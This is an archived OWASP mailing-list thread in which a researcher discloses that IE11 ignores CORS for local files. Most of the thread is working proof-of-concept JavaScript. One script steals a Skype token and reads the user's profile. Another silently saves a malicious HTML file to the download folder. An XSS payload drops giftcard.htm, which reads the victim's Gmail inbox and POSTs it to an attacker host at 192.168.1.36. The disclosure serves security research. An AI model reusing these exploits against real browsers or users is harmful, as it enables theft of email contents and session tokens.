@@ -1,0 +1,261 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Owasp-testing] IE11 is not following CORS specification for	local files
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:owasp-testing%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-testing%5D%20IE11%20is%20not%20following%20CORS%20specification%20for%0A%09local%20files&In-Reply-To=%3CCAE5Wca1-O_KqEMZEOQys8BJ1pY%3DE8JbdQ7FXN%2BQrB4_HzSu8SA%40mail.gmail.com%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <style type="text/css">
+       pre {
+           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
+           }
+   </style>
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   
+   
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Owasp-testing] IE11 is not following CORS specification for	local files</H1>
+    <B>Ricardo Iramar dos Santos</B> 
+    <A HREF="mailto:owasp-testing%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-testing%5D%20IE11%20is%20not%20following%20CORS%20specification%20for%0A%09local%20files&In-Reply-To=%3CCAE5Wca1-O_KqEMZEOQys8BJ1pY%3DE8JbdQ7FXN%2BQrB4_HzSu8SA%40mail.gmail.com%3E"
+       TITLE="[Owasp-testing] IE11 is not following CORS specification for	local files">riramar at gmail.com
+       </A><BR>
+    <I>Fri Oct  7 20:09:16 UTC 2016</I>
+    <P><UL>
+        
+        
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#2441">[ date ]</a>
+              <a href="thread.html#2441">[ thread ]</a>
+              <a href="subject.html#2441">[ subject ]</a>
+              <a href="author.html#2441">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Same attack using XSS as vector.
+Imagine that <A HREF="https://xss-doc.appspot.com">https://xss-doc.appspot.com</A> is a site about gift cards.
+The XSS payload below will create a giftcard.htm file in the default
+download folder.
+If the victim open the file a GET to
+<A HREF="https://mail.google.com/mail/u/0/#inbox">https://mail.google.com/mail/u/0/#inbox</A> will be submitted.
+After the GET the file will perform a POST to
+<A HREF="http://192.168.1.36/req.php">http://192.168.1.36/req.php</A> using the GET response as a body.
+An attacker would be able to read all the emails in the following requests.
+I tested on Win7SP1 and IE11 with all patches and it worked.
+
+<A HREF="https://xss-doc.appspot.com/demo/2?query=%3Cscript%3Eif%28typeof+Blob+%21%3D%3D+%22undefined%22%29%7BdemoBlobs%28%29%3B%7Dfunction+demoBlobs%28%29%7Bvar+blob+%3D+new+Blob%28%5B%22%3Chtml%3E%3Cbody+onload%3D%5C%22go%28%29%5C%22%3E%3Cscript%3Efunction+req%28mtd%2Curl%2Cbdy%29%7Bvar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28mtd%2Curl%2Cfalse%29%3Bxhr.send%28bdy%29%3Breturn+xhr.responseText%3B%7D%3Bfunction+go%28%29%7Bvar+gmail%3Dreq%28%5C%22GET%5C%22%2C%5C%22https%3A%5C%2F%5C%2Fmail.google.com%5C%2Fmail%5C%2Fu%5C%2F0%5C%2F%23inbox%5C%22%2Cnull%29%3Breq%28%5C%22POST%5C%22%2C%5C%22http%3A%5C%2F%5C%2F192.168.1.36%5C%2Freq.php%5C%22%2Cgmail%29%7D%3B%3C%5C%2Fscript%3E%3C%5C%2Fbody%3E%3C%5C%2Fhtml%3E%22%5D%29%3B+++window.navigator.msSaveBlob%28blob%2C+%27giftcard.htm%27%29%3B%7D%3C%2Fscript%3E">https://xss-doc.appspot.com/demo/2?query=%3Cscript%3Eif%28typeof+Blob+%21%3D%3D+%22undefined%22%29%7BdemoBlobs%28%29%3B%7Dfunction+demoBlobs%28%29%7Bvar+blob+%3D+new+Blob%28%5B%22%3Chtml%3E%3Cbody+onload%3D%5C%22go%28%29%5C%22%3E%3Cscript%3Efunction+req%28mtd%2Curl%2Cbdy%29%7Bvar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28mtd%2Curl%2Cfalse%29%3Bxhr.send%28bdy%29%3Breturn+xhr.responseText%3B%7D%3Bfunction+go%28%29%7Bvar+gmail%3Dreq%28%5C%22GET%5C%22%2C%5C%22https%3A%5C%2F%5C%2Fmail.google.com%5C%2Fmail%5C%2Fu%5C%2F0%5C%2F%23inbox%5C%22%2Cnull%29%3Breq%28%5C%22POST%5C%22%2C%5C%22http%3A%5C%2F%5C%2F192.168.1.36%5C%2Freq.php%5C%22%2Cgmail%29%7D%3B%3C%5C%2Fscript%3E%3C%5C%2Fbody%3E%3C%5C%2Fhtml%3E%22%5D%29%3B+++window.navigator.msSaveBlob%28blob%2C+%27giftcard.htm%27%29%3B%7D%3C%2Fscript%3E</A>
+
+On Wed, Oct 5, 2016 at 4:52 PM, Ricardo Iramar dos Santos
+&lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-testing">riramar at gmail.com</A>&gt; wrote:
+&gt;<i> I did a small improvement in this attack.
+</I>&gt;<i> Using IE File API
+</I>&gt;<i> (<A HREF="https://msdn.microsoft.com/en-us/library/hh772315(v=vs.85">https://msdn.microsoft.com/en-us/library/hh772315(v=vs.85</A>).aspx) an
+</I>&gt;<i> attacker would be able to create a web page with the content below and
+</I>&gt;<i> send to a victim.
+</I>&gt;<i> A local file with the same content that I sent previously would be
+</I>&gt;<i> created on download default folder.
+</I>&gt;<i> If the victim perform the three following clicks (Save, Open and Allow
+</I>&gt;<i> blocked content) an attacker would be able to perform any request to
+</I>&gt;<i> any domain and send the content to a domain which he/she has control.
+</I>&gt;<i> If the attacker is a MitM position this could be more intersting.
+</I>&gt;<i> Since the attacker could inject this content in a HTTP page and the
+</I>&gt;<i> victim will tend to relay on that.
+</I>&gt;<i> Next step would be force the victim to click on Save, Open and Allow
+</I>&gt;<i> blocked content buttons.
+</I>&gt;<i>
+</I>&gt;<i> &lt;html&gt;
+</I>&gt;<i> &lt;body&gt;
+</I>&gt;<i> &lt;h1&gt;Saving Files Locally&lt;/h1&gt;
+</I>&gt;<i> &lt;script&gt;
+</I>&gt;<i>   if (typeof Blob !== &quot;undefined&quot;) {
+</I>&gt;<i>     demoBlobs();
+</I>&gt;<i>   }
+</I>&gt;<i>   function demoBlobs(){
+</I>&gt;<i>     var blob = new Blob([&quot;&lt;html&gt;&lt;script&gt;function
+</I>&gt;<i> createCORSRequest(method, url) {  var xhr = new XMLHttpRequest();  if
+</I>&gt;<i> (\&quot;withCredentials\&quot; in xhr) {    xhr.open(method, url, true);  } else
+</I>&gt;<i> if (typeof XDomainRequest != \&quot;undefined\&quot;) {    xhr = new
+</I>&gt;<i> XDomainRequest();    xhr.open(method, url);  } else {    xhr = null;
+</I>&gt;<i> }  return xhr;}function getClientID(text) {  return
+</I>&gt;<i> text.match('client_id:\&quot;([^\&quot;]*)\&quot;,redirect_uri')[1];}function
+</I>&gt;<i> getToken(text) {  return text.match('&lt;input type=\&quot;hidden\&quot;
+</I>&gt;<i> name=\&quot;skypetoken\&quot; value=\&quot;([^\&quot;]*)\&quot;\/&gt;')[1];}function
+</I>&gt;<i> makeCorsRequest() {  var url0 =
+</I>&gt;<i> 'https:\/\/s4w.cdn.skype.com\/0-224-0\/js\/index.js';  var xhr0 =
+</I>&gt;<i> createCORSRequest('GET', url0 );  if (!xhr0) {alert('CORS not
+</I>&gt;<i> supported');return;  }  xhr0.withCredentials = true;  xhr0.onload =
+</I>&gt;<i> function() {var text0 = xhr0.responseText;var clientid =
+</I>&gt;<i> getClientID(text0);alert('Client ID: ' + clientid);  var url1 =
+</I>&gt;<i> 'https:\/\/login.skype.com\/login?client_id='+clientid+'&amp;redirect_uri=https%3A%2F%2Fweb.skype.com%2F%3Fintcmp%3Daccountweb-_-uktrybeta';
+</I>&gt;<i>  var xhr1 = createCORSRequest('GET', url1);  if (!xhr1) {alert('CORS
+</I>&gt;<i> not supported');return;  }  xhr1.withCredentials = true;  xhr1.onload
+</I>&gt;<i> = function() {var text1 = xhr1.responseText;var token =
+</I>&gt;<i> getToken(text1);alert('Skype Token: ' + token);  var url2 =
+</I>&gt;<i> 'https:\/\/api.skype.com\/users\/self\/profile';  var xhr2 =
+</I>&gt;<i> createCORSRequest('GET', url2);  if (!xhr2) {alert('CORS not
+</I>&gt;<i> supported');return;  }  xhr2.withCredentials = true;
+</I>&gt;<i> xhr2.setRequestHeader(\&quot;X-Skypetoken\&quot;, token);  xhr2.onload =
+</I>&gt;<i> function() {var text2 = xhr2.responseText;alert('User Profile: ' +
+</I>&gt;<i> text2);  };  xhr2.onerror = function() {alert('Woops, there was an
+</I>&gt;<i> error making the request.');  };  xhr2.send();  };  xhr1.onerror =
+</I>&gt;<i> function() {alert('Woops, there was an error making the request.');
+</I>&gt;<i> };  xhr1.send();  };  xhr0.onerror = function() {alert('Woops, there
+</I>&gt;<i> was an error making the request.');  };  xhr0.send();}&lt;\/script&gt;&lt;body
+</I>&gt;<i> onload=\&quot;makeCorsRequest()\&quot;&gt;&lt;\/body&gt;&lt;\/html&gt;&quot;]);
+</I>&gt;<i>     window.navigator.msSaveBlob(blob, 'testFile.htm');
+</I>&gt;<i>   }
+</I>&gt;<i> &lt;/script&gt;
+</I>&gt;<i> &lt;/body&gt;
+</I>&gt;<i> &lt;/html&gt;
+</I>&gt;<i>
+</I>&gt;<i> On Wed, Sep 21, 2016 at 10:10 PM, Ricardo Iramar dos Santos
+</I>&gt;<i> &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-testing">riramar at gmail.com</A>&gt; wrote:
+</I>&gt;&gt;<i> IE11 is not following CORS specification for local files like Chrome
+</I>&gt;&gt;<i> and Firefox.
+</I>&gt;&gt;<i> I've contacted Microsoft and they say this is not a security issue so
+</I>&gt;&gt;<i> I'm sharing it.
+</I>&gt;&gt;<i> From my tests IE11 is not following CORS specifications for local
+</I>&gt;&gt;<i> files as supposed to be.
+</I>&gt;&gt;<i> In order to prove I've created a malicious html file with the content below.
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> &lt;html&gt;
+</I>&gt;&gt;<i> &lt;script&gt;
+</I>&gt;&gt;<i> function createCORSRequest(method, url) {
+</I>&gt;&gt;<i>   var xhr = new XMLHttpRequest();
+</I>&gt;&gt;<i>   if (&quot;withCredentials&quot; in xhr) {
+</I>&gt;&gt;<i>     xhr.open(method, url, true);
+</I>&gt;&gt;<i>   } else if (typeof XDomainRequest != &quot;undefined&quot;) {
+</I>&gt;&gt;<i>     xhr = new XDomainRequest();
+</I>&gt;&gt;<i>     xhr.open(method, url);
+</I>&gt;&gt;<i>   } else {
+</I>&gt;&gt;<i>     xhr = null;
+</I>&gt;&gt;<i>   }
+</I>&gt;&gt;<i>   return xhr;
+</I>&gt;&gt;<i> }
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> function getClientID(text) {
+</I>&gt;&gt;<i>   return text.match('client_id:&quot;([^&quot;]*)&quot;,redirect_uri')[1];
+</I>&gt;&gt;<i> }
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> function getToken(text) {
+</I>&gt;&gt;<i>   return text.match('&lt;input type=&quot;hidden&quot; name=&quot;skypetoken&quot;
+</I>&gt;&gt;<i> value=&quot;([^&quot;]*)&quot;/&gt;')[1];
+</I>&gt;&gt;<i> }
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> function makeCorsRequest() {
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   var url0 = '<A HREF="https://s4w.cdn.skype.com/0-224-0/js/index.js">https://s4w.cdn.skype.com/0-224-0/js/index.js</A>';
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   var xhr0 = createCORSRequest('GET', url0 );
+</I>&gt;&gt;<i>   if (!xhr0) {
+</I>&gt;&gt;<i> alert('CORS not supported');
+</I>&gt;&gt;<i> return;
+</I>&gt;&gt;<i>   }
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr0.withCredentials = true;
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr0.onload = function() {
+</I>&gt;&gt;<i> var text0 = xhr0.responseText;
+</I>&gt;&gt;<i> var clientid = getClientID(text0);
+</I>&gt;&gt;<i> alert('Client ID: ' + clientid);
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   var url1 = '<A HREF="https://login.skype.com/login?client_id=">https://login.skype.com/login?client_id=</A>'+clientid+'&amp;redirect_uri=https%3A%2F%2Fweb.skype.com%2F%3Fintcmp%3Daccountweb-_-uktrybeta';
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   var xhr1 = createCORSRequest('GET', url1);
+</I>&gt;&gt;<i>   if (!xhr1) {
+</I>&gt;&gt;<i> alert('CORS not supported');
+</I>&gt;&gt;<i> return;
+</I>&gt;&gt;<i>   }
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr1.withCredentials = true;
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr1.onload = function() {
+</I>&gt;&gt;<i> var text1 = xhr1.responseText;
+</I>&gt;&gt;<i> var token = getToken(text1);
+</I>&gt;&gt;<i> alert('Skype Token: ' + token);
+</I>&gt;&gt;<i>   var url2 = '<A HREF="https://api.skype.com/users/self/profile">https://api.skype.com/users/self/profile</A>';
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   var xhr2 = createCORSRequest('GET', url2);
+</I>&gt;&gt;<i>   if (!xhr2) {
+</I>&gt;&gt;<i> alert('CORS not supported');
+</I>&gt;&gt;<i> return;
+</I>&gt;&gt;<i>   }
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr2.withCredentials = true;
+</I>&gt;&gt;<i>   xhr2.setRequestHeader(&quot;X-Skypetoken&quot;, token);
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr2.onload = function() {
+</I>&gt;&gt;<i> var text2 = xhr2.responseText;
+</I>&gt;&gt;<i> alert('User Profile: ' + text2);
+</I>&gt;&gt;<i>   };
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr2.onerror = function() {
+</I>&gt;&gt;<i> alert('Woops, there was an error making the request.');
+</I>&gt;&gt;<i>   };
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr2.send();
+</I>&gt;&gt;<i>   };
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr1.onerror = function() {
+</I>&gt;&gt;<i> alert('Woops, there was an error making the request.');
+</I>&gt;&gt;<i>   };
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr1.send();
+</I>&gt;&gt;<i>   };
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr0.onerror = function() {
+</I>&gt;&gt;<i> alert('Woops, there was an error making the request.');
+</I>&gt;&gt;<i>   };
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i>   xhr0.send();
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> }
+</I>&gt;&gt;<i> &lt;/script&gt;
+</I>&gt;&gt;<i> &lt;body&gt;
+</I>&gt;&gt;<i> &lt;button onclick=&quot;makeCorsRequest()&quot;&gt;Click me&lt;/button&gt;
+</I>&gt;&gt;<i> &lt;/body&gt;
+</I>&gt;&gt;<i> &lt;/html&gt;
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> The file above will be able to get an skype token and perform get on
+</I>&gt;&gt;<i> the user profile. Instead of using alert() function I could send this
+</I>&gt;&gt;<i> information to a domain that I have control.
+</I>&gt;&gt;<i> Of course the victim needs to open the file from his local drive or
+</I>&gt;&gt;<i> maybe another application can open an IE instance.
+</I>&gt;&gt;<i> If the user is logged on a Microsoft account and open the html file
+</I>&gt;&gt;<i> with the content above with onload function instead of onclick I'd be
+</I>&gt;&gt;<i> able to get his profile data.
+</I>&gt;&gt;<i> This is a simple scenario. An attacker would be able to get any data
+</I>&gt;&gt;<i> from any domain that do not require a unique ID (e.g. CSRF token)
+</I>&gt;&gt;<i> which the attacker doesn't have and is unable to get.
+</I>&gt;&gt;<i> If you do the same test on Chrome or Firefox the browser will follow
+</I>&gt;&gt;<i> CORS specification and block the response content since no CORS
+</I>&gt;&gt;<i> headers is present in the response.
+</I>&gt;&gt;<i> I tested on IE11 running on Win7SP1  with all security patches and it
+</I>&gt;&gt;<i> worked. On Win10 didn't work. I didn't test in any server with CORS
+</I>&gt;&gt;<i> enabled.
+</I>&gt;&gt;<i> If you think in another malicious scenario please let me know.
+</I>&gt;&gt;<i>
+</I>&gt;&gt;<i> Thanks!
+</I>&gt;&gt;<i> Ricardo Iramar
+</I></PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	
+	
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#2441">[ date ]</a>
+              <a href="thread.html#2441">[ thread ]</a>
+              <a href="subject.html#2441">[ subject ]</a>
+              <a href="author.html#2441">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="https://lists.owasp.org/mailman/listinfo/owasp-testing">More information about the Owasp-testing
+mailing list</a><br>
+</body></html>
